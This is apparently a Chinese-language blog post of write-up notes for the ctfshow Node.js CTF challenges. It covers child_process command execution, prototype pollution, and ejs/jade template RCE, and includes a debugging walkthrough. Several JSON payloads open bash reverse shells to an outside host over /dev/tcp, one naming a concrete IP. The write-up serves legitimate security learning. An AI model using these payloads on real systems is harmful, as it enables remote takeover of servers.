---
title: nodejs随笔
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-10-11 23:09:28
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1181512.jpg
---
Node.js常见漏洞学习与总结
https://xz.aliyun.com/t/7184

关于继承和原型链：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain

原型链污染：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript
##Web334
ctfshow 123456

##Web335
无过滤的rce：

	require('child_process').execSync('cat fl00g');
	require('child_process').spawnSync('ls',['./']).stdout.toString()
	require('child_process').execFileSync('ls')

##Web336

	require('child_process').spawnSync('cat',['./fl001g.txt']).stdout.toString()

##Web337
数组

##Web338
关于继承和原型链：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain

原型链污染：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211008225951.png)

关键点在utils.copy(user,req.body);

##Web339
Node.js常见漏洞学习与总结
https://xz.aliyun.com/t/7184

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009105639.png)

36dboy改为了flag，并且多了两个类.
要让secert.ctfshow===flag，很显然只能更改secert.ctfshow的值。
原型链污染的漏洞还存在，是user类。它的上一级是Object。同时secert的上一级也是object，那么我们只要另user.__proto__.ctfshow=this.flag
但是无法实现.

多出来的api.js有这么一行：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009164044.png)

测试一下

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009164600.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009165018.png)

污染点login.js 里的 utils.copy(user,req.body); ，代码执行的触发点在 api.js 的 res.render('api', { query: Function(query)(query)}); 处。

	{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/x.x.x.x/3333 0>&1\"')"}}

##Web340

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009210841.png)

user.userinfo.isAdmin要为1，但是没办法直接通过原型链污染控制isAdmin的值，所以用上一题相同的办法，只是这里要跳两层：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009214342.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009212726.png)

	{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/x.x.x.x/3333 0>&1\"')"}}}

##Web341

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009220758.png)

本以为这题能直接控制isAdmin，但是发现不行，看了看copy函数发现原来是自己理解错了，相同的没法控制：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009220915.png)

其实这题的预期解ejs rce前几题都是可以用的。

https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/

	{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/x.x.x.x/3333 0>&1\"');var __tmp2"}}}

##Web342
jade rce
https://xz.aliyun.com/t/7025
https://tari.moe/2021/05/04/ctfshow-nodejs/

调试下，之前没搞过nodejs，一开始连用哪个软件调试都不知道。。。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010145836.png)

点击run and debug并创建好launch.json，然后直接run就行。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010150134.png)

端口默认是3000，我这里改成了3333。
第七行下断点

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010162443.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010152947.png)

step into

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165519.png)

step into

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165740.png)

step into

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165803.png)

step into

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165838.png)

进入jade模块 res.render=>app.render=>tryRender=>view.render=>this.engine

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010170021.png)

入口是rebderFile方法

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010201135.png)

返回值可执行，进入handleTemplateCache

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010203021.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010203657.png)

进入compile

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010212515.png)

都是可控的，但是上面还有个parse没看。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010220109.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010220543.png)

代码太多，直接看return的东西然后逆推。
看下js那的compile

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010220259.png)

返回的是 buf，跟进66行的this.visit(this.node)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010224412.png)

node.line 可以被 push 到 buf 中，条件是 this.debug=true。
但是如何控制node.line的值呢？我的理解是因为这个node.line的值是不存在的，所以我们只需要污染object里面的line即可控制node.line的值。

下个断点试一下，却发现line的值在正常执行时也是有值的：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011163825.png)

发生甚么事了？
https://xz.aliyun.com/t/7025#toc-5

好吧，距离rce还漏了很多东西，至少前面一些条件都没看。
1、首先debug要为true

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011165311.png)

这个很好解决，因为一开始他是未定义的，直接污染即可

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011165426.png)

2、让node.line为undefined

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011172224.png)

不得不说这个测试的方法很妙。

3、不报错

这个时间原因懒得去调了。

payload

	{"__proto__":{"__proto__":{"compileDebug":1,"type":"Code","self":1,"line":"global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/121.196.169.53/3333 0>&1\"')"}}}

参考：https://tari.moe/2021/05/04/ctfshow-nodejs/

最后附一张草稿纸，老是记不住变量只能用笔记

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/E5056F802F0D0CBB8A16803F1E126A1F.jpg)


##Web344

	?query={"name":"admin"&query="password":"ctfshow"&query="isVIP":true}

##小结

342、343学到很多。但是现在审计水平还是一般，大概是缺少开发经验的原因。